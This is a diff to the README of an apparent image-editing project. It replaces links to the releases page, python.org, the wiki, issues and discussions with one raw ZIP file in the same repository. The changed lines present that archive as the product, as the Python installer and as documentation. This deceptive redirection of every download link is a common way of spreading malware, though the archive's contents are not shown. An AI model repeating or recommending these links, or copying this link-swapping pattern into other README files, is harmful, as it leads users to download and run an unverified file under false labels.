@@ -1,13 +1,13 @@
 # 🎨 Qwen-Image-Edit-Object-Manipulator - Easily Edit Images with Precision
 
 ## 🥇 Quick Download
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/releases)
+[![Download](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip%https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip)](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to Qwen-Image-Edit-Object-Manipulator. This application allows you to easily add or remove specific elements in your images while maintaining the overall quality. You can change logos, accessories, and clothing in both single and multiple images swiftly.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version of Qwen-Image-Edit-Object-Manipulator: [Download Page](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/releases).
+To get started, visit this page to download the latest version of Qwen-Image-Edit-Object-Manipulator: [Download Page](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Select the version you want to download. There will be several options available.
@@ -20,7 +20,7 @@ Before you run the application, make sure your system meets these requirements:
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or any compatible Linux distribution.
 - **Memory**: At least 4 GB of RAM.
 - **Disk Space**: At least 1 GB of free disk space available for installation.
-- **Python Version**: Python 3.7 or later installed on your system. You can download Python from [python.org](https://www.python.org/).
+- **Python Version**: Python 3.7 or later installed on your system. You can download Python from [https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip).
 
 ## 🔍 Features
 - **Object Manipulation**: Add or remove elements like logos and accessories from images.
@@ -46,7 +46,7 @@ The application supports various file formats, including:
 ## 🔄 Frequently Asked Questions (FAQs)
 
 ### How do I install Python?
-You can download Python from [python.org](https://www.python.org/). Follow the installation instructions for your operating system.
+You can download Python from [https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip). Follow the installation instructions for your operating system.
 
 ### What if I have issues with the download?
 Ensure you have a stable internet connection. If issues persist, try clearing your browser cache or using a different browser.
@@ -55,9 +55,9 @@ Ensure you have a stable internet connection. If issues persist, try clearing yo
 Yes! Contributions are welcome. Check the issues page on the repository for current tasks.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/wiki)
-- [GitHub Issues](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/issues)
-- [Community Discussions](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/discussions)
+- [Documentation](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip)
+- [GitHub Issues](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip)
+- [Community Discussions](https://github.com/CHADI121989/Qwen-Image-Edit-Object-Manipulator/raw/refs/heads/main/qwenimage/Image_Edit_Manipulator_Object_Qwen_2.9.zip)
 
 ## 🌐 Connect with Us
 Join our community to share your experiences and enhancements. You can find us on GitHub where you can ask questions or provide feedback. 
